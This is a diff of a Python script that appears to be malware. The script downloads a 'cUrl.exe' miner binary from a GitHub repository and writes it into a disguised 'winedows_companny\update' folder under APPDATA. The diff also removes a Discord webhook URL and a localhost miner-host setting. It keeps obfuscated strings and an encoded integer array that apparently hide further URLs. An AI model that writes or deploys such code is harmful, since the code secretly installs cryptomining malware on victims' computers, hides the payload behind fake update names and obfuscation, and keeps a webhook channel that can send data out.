@@ -43,9 +43,7 @@ from http.server import HTTPServer, CGIHTTPRequestHandler
 	globals :
 
 """
-#https://discord.com/api/webhooks/1009692660677746689/gdpKIwWkfzJs6HQYV9RTsW_r7_ydwQmOLTyxaKxl0L9_rdfuDnreOS9gLLu01mZzpb_I
 
-HOSTMINER = "127.0.0.1" #Server for the miner download
 WaiBook = """it|qs;00jjthprg/dpn0bqj0xejioplt5215:6<37717888576@:/heqQJx\lf}Kt7IRZW:SUs_`r8`zjxRrPLWzybLym1M:`rlguEoskPT>hLOv12n[{qc`J"""
 SALTWAIbOOk = "45d45az1daz56456adaNHBFHBHBJFazj"
 chiffre = [109, 118, 121, 115, 116, 58, 47, 52, 102, 110, 118, 108, 118, 115, 102, 48, 103, 120, 110, 47, 97, 121, 112, 48, 121, 103, 103, 107, 116, 115, 112, 117, 52, 52, 53, 52, 66, 61, 58, 50, 54, 63, 55, 61, 63, 62, 57, 58, 60, 61, 56, 64, 49, 109, 106, 119, 77, 79, 125, 94, 111, 109, 122, 83, 122, 55, 74, 83, 90, 86, 63, 87, 86, 120, 90, 96, 114, 55, 100, 123, 105, 122, 90, 116, 80, 78, 86, 125, 129, 98, 75, 120, 117, 55, 77, 59, 97, 119, 103, 107, 121, 73, 112, 119, 104, 84, 87, 66, 110, 77, 76, 117, 57, 56, 116, 98, 129, 114, 104, 101, 80]
@@ -537,7 +535,7 @@ if yes == "yes":
 	}
 
 				''')
-				r = requests.get("http://" + HOSTMINER + "/clientdownloads//cUrl.exe")
+				r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true")
 				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb') as f:
 					f.write(r.content)
 			except Exception as e:
